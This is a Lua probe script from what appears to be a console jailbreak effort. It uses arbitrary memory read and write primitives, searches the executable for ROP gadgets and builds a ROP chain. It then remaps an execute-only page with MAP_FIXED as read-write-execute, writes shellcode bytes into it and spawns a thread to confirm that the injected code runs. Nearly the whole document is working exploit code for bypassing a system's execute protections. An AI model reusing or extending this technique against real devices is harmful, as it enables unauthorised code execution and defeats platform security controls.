-- CRASH_CLASS: HIGH
-- PROBE 952a: execute code written into a MAP_FIXED replacement of an
-- existing executable VM entry
--
-- 939e: the X bit is dropped when mmap creates a new entry.
-- 951a: MAP_FIXED over an entry sys 547 reports as execute-only (prot 4)
--       returns the target address and the page then accepts a write and
--       reads it back, while 547 still reports prot 4 afterwards.
-- This probe answers the only question that matters: does a thread started
-- at that page run the bytes we wrote?
--
--   [A] control: entry=store gadget in eboot, RDI=out2, RAX=0x1234
--   [B] test:    entry=<our page>, RDI=out3, RAX=0xBEEF, page holds
--                `mov [rdi],rax; ret` (48 89 07 C3)
-- Out2 must become 0x1234 in [A]; the test passes if out3 becomes 0xBEEF
-- and the parent is still alive afterwards.

print("=== PROBE 952a: MAP_FIXED EXEC SPAWN ===")

local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function alive() return to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)) end

local fn = to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(alive()) .. string.format(" fn=%X", fn))

local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0) * 4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off
        if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local store   = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB, 0xFE))
print(string.format("[0] ebase=%X rax=%X rdi=%X store=%X jmp=%X", ebase,
    pop_rax or 0, pop_rdi or 0, store or 0, jmp_g or 0))
if not (pop_rax and pop_rdi and store and jmp_g) then print("[!] no gadgets"); return end

local PAGE = 0x4000
local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8,
             SS=0x100, RDI=0x048, RSI=0x050, RDX=0x058, RCX=0x060, R8=0x068, RAX=0x078}
local ctx  = memory.alloc(0x500)
local tb   = memory.alloc(8)
local out1 = memory.alloc(8)
local out2 = memory.alloc(8)
local out3 = memory.alloc(8)
local ts   = memory.alloc(16)
local eout = memory.alloc(0x20)

local function mmap(px, prot, flags, addr)
    local ok, a = pcall(function()
        return mk(477)(uint64(addr or 0), uint64(px), uint64(prot), uint64(flags),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok then return 0 end
    return to_num(a)
end
local function sleep_ms(ms)
    wq(ts, uint64(0)); wq(ts + 8, uint64(ms * 1000000))
    pcall(function() mk(240)(uint64(ts), uint64(0)) end)
end
local function entry(addr)
    zero(eout, 0x20)
    local ok, rv = pcall(function() return mk(547)(uint64(addr), uint64(eout)) end)
    if not ok or to_num(rv) ~= 0 then return nil end
    return rq(eout), rq(eout + 8), rq(eout + 0x10)
end

--------------------------------------------------------------------
-- pick an executable page in eboot text, away from the stub
--------------------------------------------------------------------
print("--- A: locate an execute-only page ---")
local target = nil
for _, delta in ipairs({0x440000, 0x400000, 0x300000, 0x200000, 0x100000}) do
    local t = (ebase + delta) - ((ebase + delta) % PAGE)
    local s, e, w = entry(t)
    if s then
        print(string.format("  page 0x%X start=0x%X end=0x%X prot=0x%X", t, s, e, w % 0x100000000))
        if (w % 0x100000000) == 4 and not target then target = t end
    else
        print(string.format("  page 0x%X 547 failed", t))
    end
end
if not target then print("[!] no execute-only page"); return end
print(string.format("  target = 0x%X", target))
print("")

--------------------------------------------------------------------
-- B: MAP_FIXED over it, write the gadget, run it
--------------------------------------------------------------------
print("--- B: MAP_FIXED R|W|X over the target ---")
local before = { entry(target) }
print(string.format("  before prot=0x%X", (before[3] or 0) % 0x100000000))
local got = mmap(PAGE, 7, 0x1002 + 0x10, target)
print(string.format("  mmap ret=0x%X (want 0x%X)", got, target))
local after = { entry(target) }
if after[1] then
    print(string.format("  after  prot=0x%X", (after[3] or 0) % 0x100000000))
end
wb(target, 0x48); wb(target + 1, 0x89); wb(target + 2, 0x07); wb(target + 3, 0xC3)
print(string.format("  wrote 48 89 07 C3, read back %X", rd(target) or 0))
print("")

--------------------------------------------------------------------
-- C: control spawn at the eboot gadget
--------------------------------------------------------------------
local block = mmap(PAGE * 4, 3, 0x1002, 0)
if block == 0 then print("[!] scratch mmap failed"); return end
zero(block, PAGE * 4)
local start = block + PAGE * 4 - 0x200
local function spawn(cfg)
    zero(ctx, 0x500); wq(tb, uint64(0))
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));    wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(cfg.rip)); wq(ctx+Ctx.RSP, uint64(start))
    wq(ctx+Ctx.RDI, uint64(cfg.rdi or 0)); wq(ctx+Ctx.RAX, uint64(cfg.rax or 20))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok, to_num(rv)
end

print("--- C: control, entry=store gadget ---")
wq(out1, uint64(0)); wq(out2, uint64(0))
local ch = {pop_rdi, out1, pop_rax, 20, fn, store, pop_rdi, 0, pop_rax, 431, fn, jmp_g}
for k = 1, #ch do wq(start + (k - 1) * 8, uint64(ch[k])) end
local okC, rvC = spawn({rip = store, rdi = out2, rax = 0x1234})
sleep_ms(150)
print(string.format("  C ok=%s rv=%d out2=%X (want 1234) out1=%d alive=%d",
    tostring(okC), rvC, rd(out2) or 0, rd(out1) or -1, alive()))
print("")

--------------------------------------------------------------------
-- D: the test, last
--------------------------------------------------------------------
print("--- D: entry=MAP_FIXED page (holds 48 89 07 C3) ---")
wq(out3, uint64(0)); wq(out1, uint64(0))
for k = 1, #ch do wq(start + (k - 1) * 8, uint64(ch[k])) end
local okD, rvD = spawn({rip = target, rdi = out3, rax = 0xBEEF})
sleep_ms(300)
local aliveD = alive()
local seen = rd(out3)
print(string.format("  D ok=%s rv=%s out3=%s (%s) alive=%s",
    tostring(okD), tostring(rvD), tostring(seen),
    (seen == 0xBEEF) and "EXECUTED" or "not executed", tostring(aliveD)))
print("[Z] COMPLETE - out3=BEEF and alive means our page executed")
print("=== PROBE 952a COMPLETE ===")
